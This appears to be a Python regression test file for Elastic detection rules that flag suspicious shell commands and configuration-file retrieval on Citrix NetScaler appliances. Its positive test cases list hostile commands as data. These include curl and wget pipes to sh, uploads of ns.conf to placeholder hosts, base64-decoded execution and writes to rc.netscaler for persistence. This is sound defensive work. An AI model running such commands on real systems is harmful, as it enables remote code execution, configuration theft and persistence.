# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

"""Regression tests for NetScaler audit and configuration retrieval rules."""

import tomllib
import unittest
from pathlib import Path

import eql

RULES = Path(__file__).resolve().parents[1] / "rules" / "network"


def rule_contents(filename):
    return tomllib.loads((RULES / filename).read_text())


def event(**fields):
    result = {}
    for path, value in fields.items():
        current = result
        *parents, leaf = path.split(".")
        for parent in parents:
            current = current.setdefault(parent, {})
        current[leaf] = value
    return result


def matches_eql(query, document):
    with eql.parser.elasticsearch_syntax:
        parsed = eql.parse_query(query)
    engine = eql.PythonEngine()
    matches = []
    engine.add_output_hook(matches.append)
    engine.add_query(parsed)
    engine.stream_events([eql.Event("generic", 1, document)])
    return bool(matches)


class TestNetScalerRules(unittest.TestCase):
    def test_audit_command_patterns(self):
        query = rule_contents("execution_netscaler_suspicious_shell_command_audit.toml")["rule"]["query"]
        positives = [
            "shell curl -fsSL https://example.invalid/inert | sh",
            "shell fetch -qo - https://example.invalid/inert | sh",
            "shell wget -qO- https://example.invalid/inert | bash",
            "shell tar czf /var/netscaler/logon/LogonPoint/a -C /flash nsconfig",
            "shell curl --data-binary @/nsconfig/ns.conf http://192.0.2.10:9000/inert",
            "shell curl --upload-file /nsconfig/ns.conf https://example.invalid/inert",
            "shell curl -T /nsconfig/ns.conf https://example.invalid/inert",
            "shell grep INDEX: /var/log/httpaccess.log | sed 's/INDEX://' | base64 -d | sh",
            "shell echo inert >> /nsconfig/rc.netscaler",
            "shell printf inert >> /nsconfig/rc.netscaler",
            "shell printf inert | tee -a /nsconfig/rc.netscaler",
            "shell cp /tmp/inert /nsconfig/rc.netscaler",
            "shell mv /tmp/inert /nsconfig/rc.netscaler",
            "shell chmod +x /flash/.nsvm/inert",
            "shell nohup /flash/.nsvm/inert",
        ]
        negatives = [
            "shell curl -fsSL https://example.invalid/file | sha256sum",
            "shell curl -fsSL https://example.invalid/file | tshark -r -",
            "shell restart service; cat /flash/nsconfig/ns.conf",
            "show ns config",
            "shell curl -I https://example.invalid/health",
        ]

        for field in ("process.command_line", "citrix.detail", "citrix_adc.log.message"):
            for command in positives:
                with self.subTest(field=field, command=command):
                    value = command
                    if field != "process.command_line":
                        value = f'User rta-admin - Command "{command}" - Status "Success"'
                    document = event(
                        **{
                            "data_stream.dataset": "citrix_adc.log",
                            "citrix.name": "CMD_EXECUTED",
                            field: value,
                        }
                    )
                    self.assertTrue(matches_eql(query, document))
            for command in negatives:
                with self.subTest(field=field, command=command):
                    value = command
                    if field != "process.command_line":
                        value = f'User rta-admin - Command "{command}" - Status "Success"'
                    document = event(
                        **{
                            "data_stream.dataset": "citrix_adc.log",
                            "citrix.name": "CMD_EXECUTED",
                            field: value,
                        }
                    )
                    self.assertFalse(matches_eql(query, document))

    def test_configuration_retrieval_scope_and_mapping(self):
        contents = rule_contents("collection_netscaler_configuration_archive_http_retrieval.toml")
        rule = contents["rule"]
        query = rule["query"]
        base = {
            "data_stream.dataset": "network_traffic.http",
            "tags": "netscaler-destination",
            "source.ip": "198.51.100.2",
            "destination.ip": "192.0.2.1",
            "http.request.method": "GET",
            "http.response.status_code": 200,
            "url.path": "/logon/LogonPoint/a",
        }

        self.assertEqual(rule["name"], "Potential NetScaler Configuration File or Archive Retrieval")
        self.assertEqual(rule["threat"][0]["technique"][0]["subtechnique"][0]["id"], "T1602.002")
        self.assertTrue(matches_eql(query, event(**base)))
        self.assertTrue(matches_eql(query, event(**(base | {"url.path": "/nsconfig/ns.conf"}))))
        self.assertFalse(matches_eql(query, event(**(base | {"http.response.status_code": 404}))))
        self.assertFalse(matches_eql(query, event(**(base | {"url.path": "/unrelated/backup.zip"}))))
